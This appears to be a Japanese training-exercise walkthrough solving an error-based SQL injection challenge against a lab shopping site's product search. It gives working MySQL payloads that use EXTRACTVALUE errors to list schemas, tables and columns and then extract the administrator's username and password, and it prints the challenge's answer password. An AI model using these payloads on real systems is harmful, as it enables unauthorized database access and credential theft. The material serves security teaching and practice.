# [Pentest-Walkthrough] OS - Project: SQLインジェクション攻撃検証2

あなたの会社で管理しているサーバに「管理者としての不正ログインが確認された」と連絡がありました。どうやらデータベースに保存されていたパスワードが流出してるようです。データベースには、自社で公開しているWebサイトで利用している商品情報が保存されています。

調査の結果、当該WebサイトにSQLインジェクション脆弱性があることが判明しました。しかし、ホームページでは、ユーザの入力を受け付けて商品検索ができるものの、データベースから取得した内容を直接出力しておらず、パスワードがサイトに出力されてしまうことは考えにくいとのことでした。

SQLインジェクション脆弱性について調査し、その脆弱性を利用して、管理者のパスワードを解答してください。

## 攻略手順

今回の問題の目標は、「SQLインジェクションを利用して、管理者のパスワードを取得すること」です。

脆弱性の特定

この問題のWebサイトには、SQLインジェクション脆弱性があります。

まず、Webサイトにアクセスすると、商品の一覧と在庫検索を行うための入力ボックスがあります。試しに、商品一覧に含まれている商品名や存在していない商品名を入力してみると、入力した商品の在庫の有無や検索した商品が存在しないといったメッセージのみが表示されます。

次に、受け付けた入力を用いて、どのようなSQL文が作られているかについて考えてみましょう。一覧に含まれている商品名を入力すると、その商品の在庫の有無が表示され検索できていることがわかります。一方、その商品名のどこか1文字を削除した場合には検索に失敗してしまうことから、商品名と完全に一致しているかで検索されていると考えられます。以上を踏まえると、次のようなSQL文が作られていると考えられます。

```
SELECT <在庫を表すカラム名> FROM <商品情報のテーブル名> WHERE <商品名を表すカラム名> = '<入力文字列>';
```

ここで、問題文よりSQLインジェクションの脆弱性の存在が示されているため、次のような入力を試してみます。

```
青い花瓶' AND '1'='1　
```

なお、このような入力を与えると、仮にSQLインジェクションが存在する場合には、作成されるSQL文は、次のようになると考えられます。

```
SELECT <在庫を表すカラム名> FROM <商品情報のテーブル名> WHERE <商品名を表すカラム名> = '青い花瓶' AND '1'='1';
```

入力した結果、商品が存在しているメッセージを確認できます。

つまり、WHERE句の条件文が<商品名を表すカラム名> = '青い花瓶' AND '1'='1'となってしまい、本来、商品名の検索のみが意図されているにも関わらず、新たに'1'='1'という別の条件が追加されています。このように、本来のSQL文の構造を変化させて、意図していないSQL文を形成し、悪意のあるデータベースの操作等を行う攻撃がSQLインジェクション攻撃となります。

しかし、確かにSQLインジェクションとしての攻撃は成立していそうですが、問い合わせ結果の出力はなく、パスワードを直接出力させることは難しそうです。

正しい問い合わせ文から結果を得ることが難しいため、エラー出力に着目をしてみます。試しに、先程用いた入力からシングルクォートを1つ削除した、次のような不完全なSQL文を構成する入力を試してみます。

```
青い花瓶' AND '1='1
```

このような入力をためすと、次のようなエラーが表示されます。

```
(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'' at line 1")
```

この内容を読んでみると、SQL文に構文上の誤りがあるという内容が書かれており、問い合わせによるエラーがそのまま出力されていることがわかります。このようにエラーの内容が出力されている状況では、取得したい情報を含めたエラーを表示させることで、データベースの中身の情報を取得できます。

脆弱性の利用

それでは、表示させたいパスワードが含まれるようなエラーを発生させる方法を考えみましょう。

ここでは、EXTRACTVALUE関数を利用します。EXTRACTVALUE関数は、

```
EXTRACTVALUE(<XMLデータ>, <XPath式>)

```

の形で使用され、XMLから情報を取り出すことができるXML関数です。

`https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html`

EXTRACTVALUE関数は、第2引数に無効なXPath式が指定されると、そのXPath式を含んでエラーを表示します。無効なXPath式を与えるためには、無効な特殊文字を入れるという方法が考えられます。#, $, &といった記号はXPathの文脈では無効として扱われます。そのため、無効な特殊文字 + 表示させたい情報を第2引数に与えることで、表示させたい情報を含ませてエラーを引き起こすことができます。

以上を踏まえて、具体的な入力内容を考えてみましょう。ここでは、例としてusersテーブルからnameカラムの情報を表示させます。この場合には、次のような入力が考えられます。

```
' AND EXTRACTVALUE('a', (SELECT CONCAT('#', name) FROM users LIMIT 1)) #
```

第1引数は、特に利用しないため、適当なデータを指定します。

エラーを引き起こす第2引数については、副問合せ(サブクエリ)の結果を指定します。内部のCONCAT関数は、引数の文字列を連結した結果を返します。上記の例であれば、CONCAT関数は、XPathの文脈では無効となる#とnameカラムの値を連結させた文字列を返します。また、副問合せの結果が単一となるようにLIMIT 1を加えています。

以上により、無効な特殊文字 + 表示させたい情報をXPath式として第2引数に指定できます。結果、エラー出力に無効な特殊文字 + 表示させたい情報がXPath式として出力され、nameカラムの情報を取得できます。また、テーブル名やカラム名を変更することで、任意の情報を取得できます。

続いてパスワードを取得するために必要となる工程を考えてみましょう。

現時点では、テーブル名やカラム名などデータベースがどのように構成されているのかわからないため、これらの情報を先に集める必要があります。その後、判明した情報からパスワードを取得します。

具体的には、次のような手順が考えられます。

スキーマ名を列挙

スキーマ内のテーブル名を列挙

管理者のパスワードが含まれていそうなテーブルのカラム名を列挙

管理者のパスワードを特定

まずは、スキーマ名を調べるところから始めてみましょう。

スキーマの情報はINFORMATION_SCHEMAスキーマに格納されており、その中のSCHEMATAテーブルのSCHEMA_NAMEにスキーマ名が保存されています。

`https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html`

先程説明した入力を変更して、以下の入力を試してみましょう。

```
' AND EXTRACTVALUE('a', (SELECT CONCAT('#', schema_name) FROM information_schema.schemata LIMIT 1)) #
```

上記の入力では、次のようにSCHEMATAテーブルに格納されている1番目のスキーマ名が取得できます。

**(1105, "XPATH syntax error: '#information_schema'")

information_schemaは、MySQLがあらかじめ用意するスキーマなので、アプリケーションがこれらのスキーマの内容を変更したり参照することは、通常はほとんどありません。そのため、アプリケーションが作成したと思われるスキーマを特定しましょう。

LIMIT句では、LIMIT 0(序数), 1(個数)のように何番目の情報から何個の結果を返すのか指定できます。LIMIT句をLIMIT 2, 1と指定すると、3番目の情報から1つを取り出すという意味になります。これを利用して、順番に調べていくと、次のようなスキーマ名が得られます。

**(1105, "XPATH syntax error: '#web_data'")

web_dataスキーマは、MySQLが用意するスキーマではなく、アプリケーションが作成したスキーマであると考えられます。

そのため、次にweb_dataスキーマのテーブルを調べます。テーブル名は、INFORMATION_SCHEMA.TABLESテーブルのTABLE_NAMEカラムに格納されています。よって、次のような入力をして、テーブル名を列挙します。

```
' AND EXTRACTVALUE('a', (SELECT CONCAT('#', table_name) FROM information_schema.tables WHERE table_schema = 'web_data' LIMIT 0, 1)) #
```

先程のようにLIMIT句を変更してテーブル名を見ていくと、credやitemsというテーブル名が見つかります。 このとき、credは、その命名から認証情報が格納されているテーブルの可能性があります。

では、credテーブルのカラム名を調べてみます。カラム名は、INFORMATION_SCHEMA.COLUMNSテーブルのCOLUMN_NAMEカラムに格納されています。よって、次のような入力をして、カラム名を列挙します。

```
' AND EXTRACTVALUE('a', (SELECT CONCAT('#', column_name) FROM information_schema.columns WHERE table_schema = 'web_data' AND table_name = 'cred' LIMIT 0, 1)) #
```

これについても先程と同じように見ていくと、unameやpasswdといったカラムを確認できます。

カラム名まで調べることができたため、最後にパスワードを調べてみます。テーブル名やカラム名がわかっているため、次のような入力をします。ここではunameも含め、:区切りで表示されるようにしています。

```
' AND EXTRACTVALUE('a', (SELECT CONCAT('#', uname, ':', passwd) FROM cred LIMIT 1)) #
```

その結果、次の出力を得られます。

**(1105, "XPATH syntax error: '#admin:jotw0fm1'")

よって、admin(管理者)のパスワードは、jotw0fm1であることがわかり、解答するパスワードはjotw0fm1になります。
